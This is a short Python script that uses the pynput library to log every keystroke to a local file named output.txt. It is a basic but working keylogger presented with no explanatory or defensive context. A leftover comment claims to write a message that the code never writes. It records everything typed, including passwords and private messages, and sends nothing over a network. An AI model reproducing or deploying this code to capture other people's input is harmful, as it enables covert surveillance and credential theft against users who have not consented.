from pynput import keyboard
import sys

filename = "output.txt"

def createNotepad():
    with open(filename, "w") as file:
        # Write a message to the file
        print("")
    
def on_press(key):
    with open(filename, "a") as file:
        try:
            file.write('{0} pressed\n'.format(
                key.char))
            
        except AttributeError:
            file.write('{0} pressed\n'.format(
                key))


def listen():
    with keyboard.Listener(
            on_press=on_press) as listener:
        listener.join()
    


if __name__ == "__main__":
        createNotepad()
        listen()